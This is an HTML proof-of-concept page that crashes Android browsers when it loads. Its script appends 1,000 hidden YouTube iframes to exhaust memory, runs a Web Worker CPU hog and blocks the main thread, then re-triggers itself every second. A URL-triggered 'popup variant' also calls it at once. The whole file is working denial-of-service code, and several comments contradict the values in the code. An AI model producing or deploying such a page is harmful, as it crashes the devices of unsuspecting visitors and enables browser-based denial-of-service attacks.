<!DOCTYPE html>
<html>
<head>
    <title>Crash PoC Onload</title>
</head>
<body onload="triggerCrash()">
    <h1>Loading... (Will Crash on Android)</h1>
</body>
<script>
// Function to cause OOM crash via heavy iframes and CPU hog
function triggerCrash() {
    // Increase iframes to 500 for guaranteed OOM on Android
    for (let i = 0; i < 1000; i++) {
        let iframe = document.createElement("iframe");
        iframe.src = 'https://www.youtube.com/embed/dQw4w9WgXcQ'; // Heavier: YouTube video embed for more memory pressure (videos + scripts)
        iframe.style = 'display:none';
        document.body.appendChild(iframe);
    }
    
    // Web Worker for CPU hog (extended to 500ms)
    const workerCode = `
        onmessage = () => {
            let a = 0, b = 1;
            const start = performance.now();
            while (performance.now() - start < 1000) {
                let c = a + b;
                a = b;
                b = c;
            }
            postMessage('done');
        };
    `;
    const blob = new Blob([workerCode], {type: 'application/javascript'});
    const worker = new Worker(URL.createObjectURL(blob));
    worker.postMessage('start');
    worker.onmessage = () => worker.terminate();
    
    // Busy-wait to block main thread (extended for ANR)
    let start = performance.now();
    while (performance.now() - start < 200) {} // 200ms block
    
    // Optional: Recursive call for infinite load (permanen until crash)
    setTimeout(triggerCrash, 1000); // Re-trigger every second for persistent pressure
}

// Optional: Run immediately if no onload needed
if (location.href.indexOf("fake") !== -1) {
    triggerCrash(); // For popup variant
}
</script>
</html>
